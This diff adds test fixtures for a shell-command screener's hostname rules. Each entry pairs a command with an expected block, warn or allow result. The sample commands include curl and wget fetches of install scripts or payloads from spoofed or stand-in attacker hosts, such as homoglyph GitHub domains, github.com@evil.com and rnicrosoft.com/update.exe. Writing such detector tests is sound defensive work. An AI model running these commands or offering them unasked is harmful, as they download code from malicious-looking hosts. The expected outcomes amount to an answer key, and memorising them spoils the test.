@@ -1,0 +1,337 @@
+# Hostname rule fixtures
+
+[[fixture]]
+name = "non_ascii_hostname_cyrillic"
+min_milestone = 1
+input = "curl https://gіthub.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["non_ascii_hostname"]
+
+[[fixture]]
+name = "punycode_domain"
+min_milestone = 1
+input = "curl https://xn--80ak6aa92e.com/payload"
+context = "exec"
+expected_action = "block"
+expected_rules = ["punycode_domain"]
+
+[[fixture]]
+name = "mixed_script_cyrillic_latin"
+min_milestone = 1
+input = "curl https://gооgle.com/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["non_ascii_hostname", "mixed_script_in_label"]
+
+[[fixture]]
+name = "userinfo_trick_domain"
+min_milestone = 1
+input = "curl http://github.com@evil.com/payload"
+context = "exec"
+expected_action = "block"
+expected_rules = ["userinfo_trick"]
+
+[[fixture]]
+name = "userinfo_basic_auth_ok"
+min_milestone = 1
+input = "curl http://user:pass@example.com/api"
+context = "exec"
+expected_action = "block"
+expected_rules = ["plain_http_to_sink"]
+
+[[fixture]]
+name = "raw_ip_v4"
+min_milestone = 1
+input = "curl https://192.168.1.1/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["raw_ip_url", "private_network_access"]
+
+[[fixture]]
+name = "raw_ip_v6_loopback"
+min_milestone = 1
+input = "curl https://[::1]:8080/install.sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "non_standard_port_known_domain"
+min_milestone = 1
+input = "curl https://github.com:8443/api"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["non_standard_port"]
+
+[[fixture]]
+name = "standard_port_known_domain"
+min_milestone = 1
+input = "curl https://github.com:443/api"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "invalid_host_chars_percent"
+min_milestone = 1
+input = "curl https://exam%70le.com/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["invalid_host_chars"]
+
+[[fixture]]
+name = "invalid_host_chars_backslash"
+min_milestone = 1
+input = "curl 'https://example\\.com/install'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["invalid_host_chars"]
+
+[[fixture]]
+name = "shell_escape_removes_host_backslash"
+min_milestone = 1
+input = "curl https://example\\.com/install"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "invalid_host_chars_fullwidth_dot"
+min_milestone = 1
+input = "curl https://example．com/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["invalid_host_chars"]
+
+[[fixture]]
+name = "trailing_dot"
+min_milestone = 1
+input = "curl https://example.com./install"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["trailing_dot_whitespace"]
+
+[[fixture]]
+name = "lookalike_tld_zip"
+min_milestone = 1
+input = "curl https://payload.zip"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["lookalike_tld"]
+
+[[fixture]]
+name = "lookalike_tld_mov"
+min_milestone = 1
+input = "curl https://video.mov"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["lookalike_tld"]
+
+[[fixture]]
+name = "lookalike_tld_app"
+min_milestone = 1
+input = "curl https://malware.app"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["lookalike_tld"]
+
+[[fixture]]
+name = "lookalike_tld_dev"
+min_milestone = 1
+input = "curl https://evil.dev/install"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["lookalike_tld"]
+
+[[fixture]]
+name = "lookalike_tld_run"
+min_milestone = 1
+input = "curl https://payload.run/install"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["lookalike_tld"]
+
+[[fixture]]
+name = "confusable_domain_github"
+min_milestone = 1
+input = "curl https://githuh.com/install"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["confusable_domain"]
+
+[[fixture]]
+name = "confusable_domain_cyrillic_c"
+min_milestone = 1
+input = "curl https://gіthub.сom/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["non_ascii_hostname"]
+
+[[fixture]]
+name = "normal_domain_clean"
+min_milestone = 1
+input = "curl https://example.com/page"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "normal_known_domain"
+min_milestone = 1
+input = "curl https://github.com/user/repo"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "punycode_in_git_url"
+min_milestone = 1
+input = "git clone https://xn--n3h.example.com/repo.git"
+context = "exec"
+expected_action = "block"
+expected_rules = ["punycode_domain"]
+
+[[fixture]]
+name = "non_ascii_hostname_greek"
+min_milestone = 1
+input = "wget https://gοοgle.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["non_ascii_hostname"]
+
+[[fixture]]
+name = "non_ascii_hostname_fullwidth"
+min_milestone = 1
+input = "curl https://ｇoogle.com/payload"
+context = "exec"
+expected_action = "block"
+expected_rules = ["non_ascii_hostname"]
+
+[[fixture]]
+name = "raw_ip_private_range"
+min_milestone = 1
+input = "curl https://10.0.0.1/api/v1"
+context = "exec"
+expected_action = "block"
+expected_rules = ["raw_ip_url", "private_network_access"]
+
+[[fixture]]
+name = "raw_ip_loopback"
+min_milestone = 1
+input = "curl https://127.0.0.1:3000/status"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "userinfo_with_encoded_at"
+min_milestone = 1
+input = "curl https://user%40name@host.com/path"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "non_standard_port_unknown_domain"
+min_milestone = 1
+input = "curl https://example.com:9999/api"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "multiple_hostname_issues"
+min_milestone = 1
+input = "curl https://xn--gthub-cua.com:8443/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["punycode_domain"]
+
+[[fixture]]
+name = "trailing_whitespace_hostname"
+min_milestone = 1
+input = "curl https://example.com /install"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "confusable_domain_npmjs"
+min_milestone = 1
+input = "curl https://npnjs.com/package/evil"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["confusable_domain"]
+
+[[fixture]]
+name = "confusable_domain_pypi"
+min_milestone = 1
+input = "pip install --index-url https://pypl.org/simple/ evil"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["confusable_domain"]
+
+[[fixture]]
+name = "valid_subdomain_of_known"
+min_milestone = 1
+input = "curl https://api.github.com/repos"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "punycode_label_in_subdomain"
+min_milestone = 1
+input = "curl https://xn--abc.github.com/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["punycode_domain"]
+
+[[fixture]]
+name = "hostname_with_ideographic_period"
+min_milestone = 1
+input = "curl https://example。com/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["invalid_host_chars"]
+
+[[fixture]]
+name = "hostname_with_halfwidth_ideographic"
+min_milestone = 1
+input = "curl https://example｡com/install"
+context = "exec"
+expected_action = "block"
+expected_rules = ["invalid_host_chars"]
+
+[[fixture]]
+name = "mixed_script_label_common_only"
+min_milestone = 1
+input = "curl https://test-123.com/api"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "ocr_confusable_rnicrosoft"
+min_milestone = 3
+input = "curl https://rnicrosoft.com/update.exe"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["confusable_domain"]
+
+[[fixture]]
+name = "ocr_confusable_paypa1"
+min_milestone = 3
+input = "curl https://paypa1.com/login"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["confusable_domain"]
+
+[[fixture]]
+name = "ocr_no_false_positive_normal"
+min_milestone = 3
+input = "curl https://example.com/page"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
